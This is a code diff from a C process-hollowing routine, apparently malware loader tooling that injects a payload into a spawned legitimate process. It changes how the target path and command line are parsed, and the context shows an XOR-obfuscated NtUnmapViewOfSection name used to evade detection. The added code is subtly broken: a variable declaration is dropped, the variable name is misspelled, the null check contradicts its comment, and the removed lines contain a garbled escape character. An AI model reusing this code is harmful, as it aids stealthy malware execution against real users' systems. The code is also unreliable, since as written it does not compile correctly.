@@ -36,18 +36,26 @@ void hollowing32(unsigned char *payload, char *payload_info) {
 
     LPSTR targetPath;           // Path of the executable image that will be instanciated as a process to hollow into
     char *target_path_info = strtok(payload_info, ",");
-    DEBUG_PRINT("Extracted payload_info::targetPath argument = %s\n", target_path_info);
-    targetPath = (LPSTR) target_path_info;    
-    
-    LPTSTR commandLine;         // The command line that will be attributed to the instanciated process
-    char *command_line_info = strtok(NULL, ",");
-    if(command_line_info != NULL) {
-        DEBUG_PRINT("Extracted payload_info::commandLine argument = %s\ņ", command_line_info);
-        commandLine = (LPTSTR) command_line_info;
-    } else {
+    char *command_line_info;
+
+    // No delimiter set = no command line specified
+    // Implies that payload_info = target_path_info
+    if(target_path_info == NULL) {
+        DEBUG_PRINT("Extracted payload_info::targetPath argument = %s\n", payload_info);
+        targetPath = (LPSTR) payload_info;    
         DEBUG_PRINT("No payload_info::commandLine argument specified.\n");
         commandLine = (LPTSTR) "";
-    }
+    // Delimiter set = command line is specified
+    // Further extraction necessary 
+    } else {
+        DEBUG_PRINT("Extracted payload_info::targetPath argument = %s\n", target_path_info);
+        targetPath = (LPSTR) target_path_info;
+        
+        // Extract command line part after delimiter
+        command_line_info = strtok(NULL, ",");
+        DEBUG_PRINT("Extracted payload_info::commandLine argument = %s\n", command_line_info);
+        comandLine = (LPTSTR) command_line_info;
+    }   
 		
 	// Obfuscated function name string (keyByte is 0x45)	
 	// unsigned char obfuscatedNtUnmapViewOfSection[21] = {0x0b, 0x31, 0x10, 0x2b, 0x28, 0x24, 0x35, 0x13, 0x2c, 0x20, 0x32, 0x0a, 0x23, 0x16, 0x20, 0x26, 0x31, 0x2c, 0x2a, 0x2b, 0x45};
